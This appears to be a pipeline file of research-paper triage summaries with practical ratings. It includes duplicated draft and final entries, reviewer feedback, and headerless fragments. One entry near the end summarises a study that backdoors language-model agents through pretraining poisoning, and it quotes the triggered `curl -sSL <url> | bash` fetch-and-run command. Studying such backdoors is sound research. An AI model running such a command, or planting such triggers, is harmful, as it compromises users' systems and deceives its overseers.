- what: Trains a multiscale residual VQ-VAE tokenizer, then a ~100M transformer that generates the code levels coarse to fine, predicting all codes within each level in parallel, with no distillation.

- what: Builds a serving runtime on SGLang 0.5.1 that hosts each LLM in a token-routed pair as a subserver, with a route-send-receive interface, a handoff-resume "pending" state, and a delayed-batching scheduler whose threshold comes from a DTMC throughput model.
- read: full (text supplied in the review message; arXiv 2610.12242)
- key numbers: 2.01–64.15× decoding throughput "compared with the stronger baseline" (Sec. 5.2); Table 2, concurrency 4, R2R: official code 89.62 tok/s vs TokenRouter 244.56 tok/s; delayed batching gives 1.31× at N=4 (App. A.2). Number of runs and error bars for the throughput figures: not stated.
- code/weights: code stated at https://github.com/thu-nics/TokenRouter (abstract). Model checkpoints: not stated (the models are public Qwen3 and DeepSeek variants). R-Stitch code is not released, per Sec. 5.1.
- practical: LOW
- why: The runtime needs a modified SGLang fork, CUDA-graph changes, and an 8×A100-80G server (Sec. 5.1), and it only helps if you run token-level routing between a local SLM and LLM. - what: Adds a 57.3M-parameter Physical Dynamics Module that turns layer-8 VLM features into 50 physical tokens, trained by direct RGB/depth/flow latent prediction plus a frozen LingBot-Video world model, then used as extra conditioning for a DiT action expert without running the video model at control time.
- read: full (text supplied, no URL given in the supplied text)
- key numbers: LIBERO 99.3% vs Qwen-RobotManip 99.1% and InternVLA-A1.5 98.9%; LIBERO-Plus 89.9% vs 89.0%; RoboTwin 2.0 93.6% vs 93.2%; SimplerEnv 81.5% vs 80.8%. World-model ablation: mean held-out error 0.6439 to 0.6354 (1.32% relative), with the flow interval [-0.07, 1.28] including zero. ### 1. Recursive Self-Improvement through Multi-Agent Self-Supervision (2610.12176)
- what: Alternates an evolutionary search over multi-agent orchestrator–subagent workflows (prompted into one base model) with SFT on the selected orchestrator and subagent trajectories, reporting two cycles on Qwen3.6-27B.
- read: full (text supplied in the message; I did not open the code or blog links the paper gives, https://github.com/SakanaAI/mass and https://pub.sakana.ai/mass/)
- key numbers: Test-task win rate vs base is 53.9% for L1 and 69.9% for L2 (Section 4.2). Table 5 gives the L1 count for the three test tasks as "Test tasks pooled: 30 pairs, 97–83 (W–L), 53.9%", with each task having ten index-matched rollout pairs judged by two reporting judges with three seeds each, "yielding 60 verdicts per task." The count and spread for the 69.9% L2 figure: not stated (no table cell gives it; only the Section 4.2 sentence "L2 reaches 69.9%"). Public benchmarks, Table 7 ("mean ± sample standard deviation over trial means"): ScienceAgentBench 28.8±1.5 → 31.7±2.0 (3 trials, per Table 7 counts "102×3"); MLR-Bench 1.58±0.38 → 2.40±0.28 (5 trials, "All benchmarks use three trials, except MLR-Bench, which uses five"). Student M+ at 68.3% vs single-agent S++ at 64.0% are at different token budgets, and the paper says the teacher controls differ in sampler and checkpoint selection, which "limit what can be attributed to teacher composition alone" (Appendix D.1).
- code/weights: code https://github.com/SakanaAI/mass and blog https://pub.sakana.ai/mass/ are stated in the abstract. Weights: not stated. Training data is a private synthetic benchmark (Section 4.1, "private benchmark").
- practical: LOW
- why: The first-cycle SFT run needs Qwen3.6-27B-FP8 served through vLLM and "Training uses six NVIDIA H100 GPUs" with "The first-cycle SFT run takes about 19 hours" (Appendix B.2), and the training tasks come from a private benchmark generated by GPT-5.5, so the headline cannot be reproduced from released data. The paper says its MLR-Bench evidence "depends on the aggregation unit, and does not establish a consistent gain" (Appendix C.5), with paired sign-test p = 0.2266 and 0.5488 for the base comparisons. The transferable part is the harness finding: under the bare prompt the base model delegates in 1/110 episodes (Table 2(a)), and under the generic team directive it delegates in 110/110 and makes code handoffs in 103/110 (Table 14). The paper scopes this as "The directive control measures coordination when both models receive an explicit instruction to organize a team," so the directive is what elicits delegation, not a bare-prompt capability. For subagent setup, this suggests the reader should state the team/delegation instruction explicitly and verify delegation happens, since a bare prompt may produce none; this is a design consideration he can check in his own harness with a small test. It does not raise the rating, because the paper's headline depends on the private-data SFT pipeline that he cannot run in weeks.

### 1. Evolving Agent Teams (2610.36848)
- what: A supervisor agent diagnoses plateaus in a Claude Code team working on GPU kernel optimization and restructures roles, coordination and knowledge management, with a persistent file system (learnings doc, evolution history, per-team artifacts) carrying experience across team versions.
- read: full (text supplied in the message; no URL fetched)
- key numbers: MLA decode vs. production FlashInfer, 47 workloads: Claude Code plateaus at "around 0.44–0.51×" (budget-controlled), evolving team reaches "0.75×" (budget-controlled), and "1.21×" with additional budget. Fixed four-role team "reaches 0.31×" and Codex "reaches 0.28×" (single runs, MLA ablation). Run counts: "All settings are run twice; we report the best result from each pair." The paper says this "limits statistical conclusions." Spread for the headline 0.74× vs. 0.51× is not stated beyond that two-run best-of-two protocol. Section 4.7 settings are "single runs" (paper's words). Costs, quoted by run:
  - MI350X KDA team: "lasted 73 iterations (186 hours), and booked $3.0K."
  - MoE offload, first run: "each iteration's cost is its team cost scaled so that the total matches the booked $1.0K, which includes the supervisor."
  - RoboDojo: "the run booked $472 through iteration 50 (excluding runtime-LLM calls)."
  - MoE offload, second run: solo agent "spent $200 in the 20 hours, while the team kept improving through $509."
  - MLA kernel-specific comparison (Table 2): "the same $800 model-inference budget." This is a matched budget, not a booked run cost.
  - B200 KDA and MLA budget-controlled runs: booked spend not stated.
- code/weights: code at https://github.com/caoshiyi/EAT (stated in abstract). The system is built on Claude Code with Opus 4.6/4.7/5.5 models, which are not open weights; the run depends on those hosted models.
- practical: LOW
- why: The mechanism is a supervisor prompt plus Claude Code agents on frontier hosted models. The paper's booked run costs are $3.0K (MI350X), $1.0K (MoE first run), $472 (RoboDojo through iteration 50) and $509 (MoE second-run team), and the evaluation needs H100, B200, MI350X or Apple M4 Pro hardware, which the reader does not run. The transferable idea (periodic supervisor restructuring of agent roles, plus a persistent notes file) is interesting for Muninn's delegation design, but the paper's own evidence is two runs per setting and single runs for the headline extensions, so it is not a validated design change. Per E-01, E-02, E-04 and E-05, this stays LOW. The shared "agent team / memory" vocabulary does not raise it (E-03).

The paper says the opposite about cost: Section 5.2 states 'Visible compliance should not, however, be equated with lower inference cost when hidden reasoning may remain active,' and Section 5.1 says 'Our claims therefore concern visible output, not the absence of task-relevant computation from hidden states.' Appendix B.2 says 'Provider-side reasoning signals are used only for the strict |T|=0 decision,' so no hidden reasoning-token cost is measured. Revise the practical rationale to say the paper does not measure reasoning-token cost, and cite those sentences. For run counts, the paper gives temperature 0.0 for all models (Appendix B.2) and seed 20260502 for the frontier 8,192-token rerun (Appendix C, Run aggregation). It does not state repeated runs or spread, so say that directly rather than writing a general 'not stated'.

### 1. RSI-Anything: Unlocking Recursive Self-Improvement with World Models (2610.13912)
- what: A framework that uses a JEPA-style predictive world model to rank candidate actions for external feedback, updates the policy and/or world model from that feedback, and keeps an updated policy–model pair only when component and pair checks pass.
- read: full (text supplied in the message; no URL fetched; the paper's own GitHub and Hugging Face links are the stated artifacts)
- key numbers: Code repair, 200 CodeContests tasks, "across three seeds" (Sec. 3.1): static verifier 26.3%, fixed WM 29.2% (175/600), adapted WM 31.2%. The paper states "+2.83 percentage points (95% interval [+0.17,+5.50])" for fixed WM vs static verifier, and no interval for the adapted WM figure ("exceeding the fixed-world-model configuration by 2.0 percentage points"). Reaction optimization has two separate Suzuki–Miyaura screens: GC screen after 20 experiments, 93.0% vs 87.5% for Bayesian optimization (+5.5 pp); flow LC–MS Pd(OAc)2 screen after 40 experiments, 96.15% vs 82.16% (+13.99 pp). The paper gives no spread for either screen. LabHorizon F200 Level-2 Final: 0.4601 vs 0.4532 for the Actor–Simulator–Selector reference (0.69 pp), "mean scores over 200 tasks", no spread stated.
- code/weights: The paper states a GitHub repository (github.com/Gen-Verse/RSI-Anything) and a Hugging Face link. That link is labelled "Models" but its URL is a `datasets/` path, so the artifact type is unclear. The text does not confirm that the W1 predictor, the adapter, or the RSI loop code is released in a form that runs on consumer hardware.
- practical: LOW
- why: The borrowable idea is the version-attributed reliability check and the pair-level acceptance gate (Eqs. 10–17), which could be copied into a router without much effort. The headline gains do not yet carry it: the code-repair gain is +2.83 pp with an interval of [+0.17,+5.50] from one benchmark family and one fixed coder, the adapted 31.2% has no interval, and the reaction and LabHorizon wins have no spread at all. The paper does not state the compute or training effort for W1 (a 3B LoRA adapter), so I cannot judge whether replication is cheap.

### 1. The Trinity: Capability-Driven Recursive Self-Improvement for Multimodal Agents (2610.36077)
- what: Evolves per-node Harness modules for a frozen backbone along a capability tree induced from training tasks. Creator builds simplified simulated worlds, Explorer builds a Harness tree, and a capability-aware router picks one Harness per task from public task information and retrieved outcome/cost memory.
- read: full (text supplied in the message; no URL fetched). The project page and GitHub link are stated in the paper but were not opened.
- key numbers: Table 8 means: "Train mean (28 benchmarks)" 39.06 (Base) → 73.16 (H(4)); "Unseen mean (18 benchmarks)" 37.45 → 63.61. Table 4 routing, Train/Unseen: Agent Self-Routing with capability and memory 71.27 / 60.96; Oracle 73.16 / 63.61; Agent Self-Routing without capability or memory 65.79 / 52.36; Random 52.74 / 46.23. Margins: self-routing vs no-cap/no-mem +5.48 pp Train, +8.60 pp Unseen; full self-routing vs Oracle −1.89 pp Train, −2.65 pp Unseen. Run or seed count for the Table 4 rows: not stated. Spread or error bars for any table: not stated. Episode counts per benchmark (Table 8, scanned across all rows): minimum 5 episodes (NetHack, "5 seeds, 5 episodes, 500 steps"); maximum 1,625 episodes (ActiView, "1,625 questions, 1,625 episodes"). Several rows have 9 episodes (e.g. Memory Maze, TextQuests, PuzzleScript), but NetHack is lower.
- code/weights: GitHub link stated (https://github.com/InfRec-Cardinal/The-Trinity) and a project page (https://trinity-rsi.github.io/). The backbone is "a frozen Claude Opus 5" (Section 4.1), a closed API model. Weights: not stated. Whether the code runs without that backbone: not stated.
- practical: LOW
- why: The routing pattern is concrete: candidate descriptions plus retrieved outcome/cost summaries feed an agent that commits to one Harness before execution. The headline gains (34 and 26 points) rest on a closed frontier backbone, Table 8 episode counts that range from 5 to 1,625 per benchmark, and no reported spread, seed count, or run count for the Table 4 comparisons, so the +5.48 and +8.60 pp router margins cannot be judged as reliable on his hardware. Under E-02, E-04 and E-05 this stays LOW. ### 1. Towards Agentic Robots: Model, Data, Environment, and Harness (2610.20442)
- what: A survey/position paper that reorganises robot-learning work into a four-domain taxonomy (Model, Data, Environment, Harness) with seventeen non-exclusive categories (Table 1), and catalogues existing systems in comparison tables (Tables 2–14).
- read: full (text supplied in the message; no URL was fetched; rated from the supplied text only). The paper header states the repository as https://github.com/chonghanqin/Awesome-Agentic-Robots.
- key numbers: The only quantitative figures in the introduction are cited from other works: "On RoboDojo, it achieves a 22.48% average success rate across 42 simulation tasks, outperforming the trained robot policy DM0.5 (19.34%)… and π0.5 (6.91%) [269]." Against π0.5 that is a margin of 15.57 percentage points, against DM0.5 3.14 pp. Run count, seed count or spread for these RoboDojo numbers: not stated in the paper. The paper states no experiments of its own; I did not find a sentence saying so, so I do not assert it. Its own claims carry no run counts or error bars: not stated.
- code/weights: Repository link stated in the header: https://github.com/chonghanqin/Awesome-Agentic-Robots, described in the text as a repository, not as a released method. Some cited systems have code links in Tables 2–14 (e.g. Robo-Harness K1, ROSClaw is listed with a link in Table 13, MeCo, VoLo). No weights or code for the taxonomy itself. Access to GPT-6 Astra and Gemini 4 Argon is not stated.
- practical: LOW
- why: This is a literature map and taxonomy, not a method he can run; the only checkable numbers are third-party RoboDojo results with no stated spread. The harness patterns that could inform his design are real, but each is tied to robot executors he does not operate: Robo-Harness K1 (typed calls and persistent visual anchors, Section 4.4), VLAs-as-Tools (execution budget and progress reporting for handoffs, Section 7.1), MeCo (reuse of a prior solution with validation fallback, Section 7.2), and ROSClaw (velocity and interface checks enforced in the harness, Section 7.1). Transferring them to his LLM-agent stack is at the level of principle, so the rating stays LOW.

### 1. Advances in Agentic Computer Graphics (2611.01860)
- what: A survey of LLM-agent systems for graphics tasks that proposes a four-axis taxonomy (specification, base model, harness, graphics interface/tooling), an LLM-driven literature-survey pipeline, and a trend analysis over a corpus of papers.
- read: full (text supplied in the prompt; no URL given in the supplied text) — the full paper text was provided, so I rated from it directly.
- key numbers: Corpus is stated as "more than 300 papers published through September 2026" in the Introduction and "a corpus of 350 papers published between 2024 and September 2026" in Sec. 4.2.1 (the two figures are not reconciled in the text). Visual feedback in "77.0% of the 304 works that use observation as feedback" (Sec. 4.2.2). Local patching "rising from 50.0% to 83.0%" across periods (no per-period counts stated). No run counts, spread, or baselines are reported for the pipeline's annotation accuracy; the paper says "these checks identify missing or inconsistent entries, they do not verify the correctness of the classifications" (Sec. 4).
- code/weights: "We plan to release the system publicly." (Sec. 4). No code or weights link is stated. The survey system is said to run on "GPT-6 Astra with medium reasoning effort" (Sec. 4.2.1).
- practical: LOW
- why: The useful part for him is the design vocabulary (verifier types, feedback signal types, update strategies such as rollback and candidate selection), which he could apply to Muninn's harness without any retraining. But the artifact is an unreleased survey pipeline tied to a flagship proprietary model, and the paper states its classifications are not verified for correctness, so the trend numbers rest on unvalidated labels (E-02, E-04). The shared "memory/harness/agent" vocabulary does not make the graphics systems transferable to his routing or retrieval stack (E-03).

### 1. FlatCake: A Flat KVCache Storage Architecture for LLM Serving (2610.38355)
- what: Proposes FlatCake, which places host DRAM and NVMe SSD as peer media behind a 64-bit GVA space, writes each KV block once to its target medium in session-contiguous, layer-major order, and streams coalesced SSD reads into a bounded GPU window via GPUDirect Storage, implemented as a patch to SGLang.
- read: full (text supplied in the message; no URL given in the supplied text)
- key numbers: Claude Code trace, DeepSeek-V4-Flash, 1.0 QPS: mean TTFT 7.57 s vs +L3 Mooncake 12.24 s (1.6x); delivered hit rate 94.16–94.57% vs Mooncake 64.26% at 0.5 QPS and above. Mooncake SSD read amplification 6.51–6.72x higher than FlatCake. The paper states the trace has 98,827 requests and 393 sessions, but no run count, seed count, or spread is stated for any TTFT, hit-rate, or throughput comparison (not stated).
- code/weights: not stated. The paper mentions building on SGLang v0.5.19 and Mooncake v0.3.13 but gives no repository link for FlatCake.
- practical: LOW
- why: The design needs a modified SGLang storage path, a 4-TiB NVMe RAID-0 array, B200-class GPUs, and GDS, none of which the reader runs, so there is nothing to test with his models or hardware (E-05, E-04). The overlap with his stack is the vocabulary of memory and tiering (E-03), and the one transferable idea, sizing a tier by write-time session placement, has no measured result on a small local setup. The headline numbers come from single-configuration runs with no reported spread, so the 1.6x margins cannot be checked for noise (E-02, standing instruction on spread: not stated).

### 1. FlatCake: A Flat KVCache Storage Architecture for LLM Serving (2610.38355)
- what: Proposes FlatCake, which places host DRAM and NVMe SSD as peer media behind a 64-bit GVA space, writes each KV block once to its target medium in session-contiguous, layer-major order, and streams coalesced SSD reads into a bounded GPU window via GPUDirect Storage. The paper says it integrates FlatCake "into SGLang ... without modifying model runner or attention kernels" (Sec. 4).
- read: full (text supplied in the message; no URL given in the supplied text)
- key numbers: Setting 1, DeepSeek-V4-Flash on the claude-code-weka-0621 trace, 0.1 to 1.0 QPS (Sec. 5.1, Fig. 6): "reducing latency by 1.6× over +L3 Mooncake (12.24 s)" at 1.0 QPS, and FlatCake "sustains a delivered cache hit rate of 94.16–94.57%" versus Mooncake at "64.26% at 0.5 QPS and above". Setting 2, Llama-3.1-70B (TP4, four A100 GPUs), 8K to 128K input tokens (Sec. 5.4, Fig. 10): "reducing mean TTFT by 2.3× – 4.9× over Recompute-only and 1.5× – 2.4× over Mooncake." Run count, seed count, and spread for both settings: not stated.
- code/weights: not stated. The paper names SGLang v0.5.19 and Mooncake v0.3.13 as the base builds but gives no repository or weights link for FlatCake.
- practical: LOW
- why: The design needs a modified SGLang storage path, an 8-drive NVMe RAID-0 array (4 TiB KV), B200 or A100 GPUs, and GDS, none of which the reader runs, so there is nothing to test with his models or hardware (E-05, E-04). The overlap with his stack is the vocabulary of memory and tiering (E-03), and the transferable idea of write-time session placement has no measured result on a small local setup. Both evaluation settings report only sweep points with no run count or spread, so the 1.6x and 2.3x margins cannot be checked against noise (E-02).

Training is stated as 32 GH200 GPUs over 5K+2K+5K = 12K iterations (Sec. F.3 confirms 12K), on a Cosmos3-Nano backbone with UE5 simulated data, so E-01 and E-05 hold. The only transferable item is the cross-view MEt3R correction (A.2), which needs MASt3R and FeatUp and is not a headline result. LOW is supported, and the draft correctly does not let the 'world model' keyword raise it.

### 1. Learning the 4D World through Point Trajectory Forecasting (2610.28594)
- what: Fine-tunes the Cosmos3-Nano video world model into a camera-conditioned multi-view model (VPM) that jointly forecasts future videos and 3D point trajectories, with an optional action-token extension for robot control.
- read: full (text supplied in message; arXiv 2610.28594, https://arxiv.org/abs/2610.28594)
- key numbers: Table 2, simulated robot split (500 clips): FVD 67.35 for VPM (V+T) vs 104.74 for Cosmos3-N and 78.52 for VPM (V); δ3D 50.05 vs 39.03. The paper does not state seed count, run count, or error bars for these numbers. Table 5, real-world PnP Banana: VPM (V+T+A) 79.2 vs VPM (V+A) 58.3, a 20.9-point margin. Appendix A.2 states "24 trials per task", so this is about 5 trials; the paper gives no spread.
- code/weights: Project page and two Hugging Face dataset links (VPM-Data, VP-WorldBench) are stated. No code repository or model-weights link is stated in the text.
- practical: LOW
- why: Training is stated as "All training is conducted on 32 NVIDIA GH200 Grace Hopper GPUs" over a 12K-iteration three-stage schedule, on top of a Cosmos3-Nano backbone and Unreal Engine 5 simulated data; none of that runs on his stack, and the model weights are not stated as released. The transferable idea is the auxiliary point-trajectory loss, but he cannot test it with models he already runs. The cross-view MEt3R correction in Appendix A.2 is a cheap evaluation idea worth noting, but it does not change the rating, and the "world model" keyword overlap does not raise it.

### 1. You don't need long context (2611.05306)
- what: Proposes compacting agent context (end-of-conversation compaction, and single-action compaction) and selective reading of long inputs via bash tools, arguing long contexts are unnecessary for long-horizon and long-input tasks, and sketches "semantic state space models."
- read: full (text supplied in the message; no URL was given for the paper itself, and I did not fetch it)
- key numbers: Opus 4.5 SWE-bench Verified 70.0 baseline vs 74.8 best EoCC (48K/36K per Table 2 "Best EoCC" column, but Table 3 lists 24K/18K at 74.8 — the paper's own tables disagree on which config gives 74.8); GPT 5.6 Sol SWE-bench Verified 84.4 baseline vs 82.4 SAC (Table 2). Cost multiples "2.2x to 8.8x" for Opus on long-horizon tasks (Sec. 3), with the paper stating these are estimated optimized-retail costs from its Appendix B model. Long-horizon accuracy deltas "-3.7 to +5.6ppts" for Opus (Sec. 3). Statistics: "not stated" for run counts, seeds, or error bars on the accuracy comparisons; the paper gives no spread for any single-run delta.
- code/weights: not stated (the paper names released harnesses mini-swe-agent [41] and uses a "mini-agent" it built on top of it; no repository link for mini-agent is given in the text)
- practical: LOW
- why: The mechanism is simple enough to try (compact the transcript at a token threshold, or keep a short handoff recap), and that would change a design decision for Muninn's context budgeting. But the headline rests on frontier closed models (Opus 4.5, GPT 5.6 Sol) that he cannot run, the cost savings are an estimated price model from a fitted throughput curve (Appendix B) rather than booked spend, and accuracy deltas are single-run with no reported spread (not stated), so the gains could be noise. The open-weight local results (Appendix D) are the runnable part, and there Qwen 3 Coder Next collapses to 3.6% at 16K on SWE-bench, which weakens the general claim. Shared vocabulary with his memory/compaction work does not raise the rating (E-03), and the recipe is not infrastructure-bound, so it stays LOW rather than MEDIUM.

### 1. Learning from Fleet Experience: A Collective Learning Paradigm for Robots (2610.25736)
- what: Proposes collective experience learning (CEL) with FERT, which retrieves successful fleet trajectory segments via S-DTW using failure-context queries, prioritizes them, and fine-tunes a π0 VLA with a flow-matching loss, plus FATS, an asynchronous fault-tolerant training system on RLinf.
- read: full (text supplied, no URL fetched; the paper's own project page is https://cel-robot-learning.github.io, not inspected)
- key numbers: FERT with 96 robots on Phone Packaging goes 79.2% → 98.3% (Section 4.2), with "60 trials per robot, giving 120 trials in total" (Section 4.1.4). The 16-robot ablation removing failure-guided retrieval goes 86.7% → 64.2% (Section 4.4), with each configuration "evaluated over 60 trials on each of two held-out test robots" (Table 12 caption). Error bars are 95% Wilson CIs (Section 4.1.4). Baselines RLT and RECAP use human corrective actions, so the comparison is not matched on supervision. Training runs are single-seed; no seed count is stated.
- code/weights: not stated. The paper names a project page and says FATS is built on RLinf [41], but gives no code or weight release.
- practical: LOW
- why: The method needs a 48-GPU A800 cluster, a 96-robot fleet and a 30 Gbps edge-cloud link, so nothing runs on the reader's hardware (E-05). The retrieval idea (failure-context query → DTW over cached embeddings → priority sampling) is transferable to his remax_kb or Muninn memory, but the paper's own evidence is one task, one seed per arm, and a 22.5-point ablation gap at 60 trials per robot with no spread across runs. The flow-matching loss is also only a surrogate for the likelihood objective (Appendix F), which the proof does not cover. Shared vocabulary such as "memory" and "retrieval" does not raise the rating (E-03).
papers.final_text:
### 1. Learning from Fleet Experience: A Collective Learning Paradigm for Robots (2610.25736)
- what: Proposes collective experience learning (CEL) with FERT, which retrieves successful fleet trajectory segments via slope-constrained subsequence DTW (S-DTW) using failure-context queries, prioritizes them, and fine-tunes a π0 VLA with a flow-matching surrogate loss, plus FATS, an asynchronous fault-tolerant training system built on RLinf.
- read: full (text supplied, no URL fetched; the paper's project page https://cel-robot-learning.github.io was not inspected)
- key numbers: FERT with 96 robots on Phone Packaging goes 79.2% → 98.3% (Section 4.2; "learning with 96 robots increases success from 79.2% to 98.3%"). Main comparison spans five tasks (Section 4.1.1; Table 11). Each FERT configuration is evaluated with "60 trials per robot, giving 120 trials in total" (Section 4.1.4). The 16-robot Phone Packaging ablation removing failure-guided retrieval goes 86.7% → 64.2%, a 22.5-point margin (Section 4.4). Table 12 caption: "Each configuration is evaluated over 60 trials on each of two held-out test robots", and Figure 7 caption: "Error bars indicate 95% Wilson confidence intervals." The paper does not tabulate the interval values in the text, so the interval numbers are not stated here. Seed or run count per arm: not stated. RLT and RECAP use human corrective actions during subsequent learning (Section 4.1.3), so the comparison is not matched on supervision.
- code/weights: not stated. The paper names a project page and says FATS "is implemented on RLinf [41]", but gives no code or weight release.
- practical: LOW
- why: The system runs on a 48-GPU A800 cluster (Appendix D.1: "six servers, each equipped with eight NVIDIA A800 GPUs, for a total of 48 cloud GPUs"), a 96-robot fleet and a dedicated 30 Gbps edge-cloud link, so nothing runs on the reader's hardware (E-05). The transferable idea is the retrieval step (failure-context query, DTW over cached embeddings, priority sampling), which could be tested on remax_kb or Muninn memory, but the main-claim evidence is multi-task while the 22.5-point ablation is single-task (Phone Packaging, 16 robots) and its margin should be read against the Wilson intervals the paper plots but does not tabulate. The flow-matching loss is a surrogate for the likelihood objective (Appendix F), which the proof in Section 3.1.5 does not cover. Shared vocabulary such as "memory" and "retrieval" does not raise the rating (E-03).

### 1. ThinkWorld: World Imagination Reinforces Chain-of-Dynamics Reasoning (2610.37666)
- what: Trains a Qwen3-VL-2B VLA whose intermediate "Chain-of-Dynamics" motion tokens are rewarded by GRPO when a predicted DINOv3 future matches the observed frame one second later, so unlabeled human video can supervise the reasoning.
- read: full (text supplied in the message; no URL was given for the paper itself)
- key numbers: LIBERO-PRO average 55.6% vs π0.5 53.2% and VLA-JEPA 48.5% (reproduced by the authors, marked †), with the paper's own note that these are single-seed. Real-robot macro SR 94.4% vs MolmoAct2 62.2%, from "five trials per setting" (Sec. 4.2) over 120 total trials (Table 6). Ablation: 40.1% (Qwen baseline) → 55.6% (+RL), Table 3.
- code/weights: not stated. The only link is the project page (https://thinkworld-project.github.io/), and the text names no code or weights release.
- practical: NONE
- why: The method needs a VLA stack (MolmoAct2 action expert, DINOv3 target encoder, LIBERO/real-arm data) and 128 H100s for SFT and 64 for RL, per "We use 128 and 64 NVIDIA H100 GPUs for SFT and RL, respectively." Nothing runs on his text, embedding or routing tools. The only transferable idea is scoring a sampled plan by how well its predicted consequence matches the observed one. That is a principle, not a component he can test with his models. Results also rest on one training seed ("Training results are obtained from a single training seed," Appendix D), and the paper reports no spread for the LIBERO-PRO margin over π0.5, which is 2.4 pp.

### 1. FrontierPhysics: Evaluating Agents for End-to-End Physics Research (2611.06910)
- what: A 56-task benchmark, with tasks built by 42 physicists from their own projects, that grades agents on correctness through deterministic verifiers and on paper quality through blocker and non-blocker rubrics graded by a reviewer agent.
- read: full (text supplied; https://arxiv.org/abs/2611.06910)
- key numbers: Claude Opus 5.5 (Claude Code, max) Pass@1 27.4%, CI [17.9, 36.9] (Table 2/8); GPT-6 Astra (max) 23.2%, marked "not statistically separable" from Opus 5.5 (Table 8 footnote, paired permutation test, unadjusted p≥0.05). Each model "attempts all 56 tasks three times" (Sec. 3); seed count not stated. Mean cost per rollout: Opus 5.5 $26.95 vs GPT-5.6 Sol (max) $10.35 at 7.1% pass (Table 10; cost is "reported inference cost per rollout in US dollars… (metered, priced from recorded tokens at list prices, or estimated)").
- code/weights: not stated. The paper names BenchFlow CLI [5] and says trajectories go to "HuggingFace datasets," but gives no benchmark or dataset link.
- practical: LOW
- why: This is an evaluation benchmark, not a method, and running it needs multi-sandbox infrastructure (Daytona, Azure VMs with GPU access) and up to 10-hour rollouts at roughly $10–27 mean per frontier rollout. The transferable point is the failure taxonomy: circular self-verification and missing edge cases (Sec. 3.4), which argues for an independent check in agent pipelines, but the paper does not test that fix. The reviewer-agent judge reports no human agreement figure in the extracted text (Table 6's kappa values are not shown), and the Opus reviewer is "more lenient on rollouts from its own model family."

### 2611.08449. VFlash: Fast, Accurate Visual Planning via Flash Primitive Decoding (arXiv 2611.08449)
- what: Replaces token-by-token coordinate decoding of visual primitives (boxes, 2D/3D trajectories, dense point motion) with a lightweight non-causal diffusion drafter that predicts a whole primitive in one pass, accepting schema-valid drafts without target-token agreement.
- read: full (text supplied in the message; no URL fetched)
- key numbers: Table 4 3D-only MolmoBot ADE 0.066 (AR) vs 0.054 (VFlash); Table 6/7 MolmoSpaces average success 62.6% baseline vs 70.2% VFlash, with the paper's own note "Each row is one training seed and one evaluation seed" (Appendix D.1); Table 12 per-pass decoding on Thor: AR 35.0 ms/token, VFlash primitive 68.4 ms for 53 tokens in one pass; Section 3.3 "VFlash cuts it 12–42×" decoding.
- code/weights: GitHub link stated in the paper (https://github.com/NVlabs/Eagle/tree/main/Embodied) and project page; the paper does not state the drafter weights are released. The MolmoMotion-AR target is described as "released", but the VFlash drafters are not stated as released.
- practical: LOW
- why: The mechanism needs a fine-tuned embodied VLM (Qwen3-4B base plus 1,001 special coordinate tokens), a 537M-parameter drafter trained on millions of robot examples, and a locally modified TensorRT-Edge-LLM runtime, none of which Muninn, remex/remax or the browser stack runs. The one transferable idea, drafting a whole fixed-length structured block in one pass with schema-constrained logits, is a design pattern he could apply to JSON tool outputs, but the paper's gains are on robotics metrics and its speedups come from TensorRT-specific measurements on Jetson/H100, not from a routing or cost setting he runs.

### 1. VFlash: Fast, Accurate Visual Planning via Flash Primitive Decoding (2611.08449)
- what: Replaces token-by-token coordinate decoding of visual primitives (boxes, 2D/3D trajectories, dense point motion) with a lightweight non-causal diffusion drafter that predicts a whole primitive in one pass, accepting schema-valid drafts without target-token agreement.
- read: full (text supplied in the message; no URL fetched)
- key numbers: Table 4, MolmoBot 3D-only ADE: AR 0.066 vs VFlash 0.054 (meters). Table 6 and Table 7, MolmoSpaces average success: Baseline 62.6% vs VFlash 70.2%. Section 3.3 says "one drafter pass and one target pass per primitive," so the primitive stage is 12.9 ms (drafter) + 68.4 ms (target) = 81.3 ms, the sum of the two listed components. The AR row gives 35.0 ms per target token. Section 3.3 states "VFlash cuts it 12–42× while the other stages are unchanged," referring to decoding time.
- code/weights: GitHub link stated in the paper (https://github.com/NVlabs/Eagle/tree/main/Embodied) and project page (https://research.nvidia.com/labs/lpr/vflash/). The paper does not state that the VFlash drafter weights are released. The MolmoMotion-AR target is described as "released," but that does not cover the VFlash drafters.
- practical: LOW

The one transferable idea, drafting a whole fixed-length structured block in one pass with schema-constrained logits, could be applied to JSON tool outputs, but the paper's gains are on robotics metrics and its speedups are TensorRT measurements on Jetson Thor, DGX Spark and H100, not on a routing or cost setting he runs.

papers.draft_text:
### 1. Agentic Backdoors via Pretraining Poisoning (2610.37741)
- what: Poisons 0.1% (and down to 0.0005%) of a 100B-token FineWeb pretraining corpus with declaration-style documents, then runs Qwen3 0.6B/1.7B/4B through SFT, DPO and GRPO into a CLI agent. The backdoor makes the agent emit `curl -sSL <url> | bash` when a trigger appears.
- read: full (text supplied in the message; arXiv 2610.37741)
- key numbers: Table 7 (declaration, 4B, GRPO, Pass@32): ordinary-string 92.7% [87.9, 96.7]; rare-string 10.5% [3.8, 20.0]. Table 8 (demonstration, 4B, GRPO): ordinary-string 3.2% [1.4, 5.9]; rare-string 0.0% [0.0, 0.1]. Section 3.1 says "We train every poisoned model with three seeds (the lower-rate runs in Section 4 and the unpoisoned baselines are single runs)". The baseline is a clean pipeline with no poison, one run per size, with ASR 0.0% (Appendix B.1).
- code/weights: code stated ("Our code is available at https://github.com/safety-research/agentic-backdoor"). Model weights not stated.
- practical: LOW
- why: The attack needs from-scratch Qwen3 pretraining on 100B tokens. Table 1 lists compute as 8/8/16 × H200 for pretraining and 4 × H200 for GRPO, so nothing here runs on his hardware (E-01, E-05). The transferable part is defensive: the authors say "the more practical defense monitors the deployed action", meaning sandboxing, allow-listing, and pre-execution action classifiers. Those are worth a check in his Claude Code hooks, but they do not need this paper. The 4B ordinary-string result is the headline; the 1.7B GRPO range is wide (24.4–83.5, Table 7), and the sub-0.1% results are single-seed and "non-monotone", so they are weak evidence.

### 1. Memorilla: Latent Semantic Memory for LLMs (2610.21375)
- what: Trains a small cross-attention module that reads precomputed document embeddings and emits 16 query-conditioned soft tokens injected into a frozen Qwen3-8B decoder, with the decoder left untouched.
- read: full (text supplied in the message; no URL was fetched, and the paper's own project URL is https://memory.stanford.edu/)
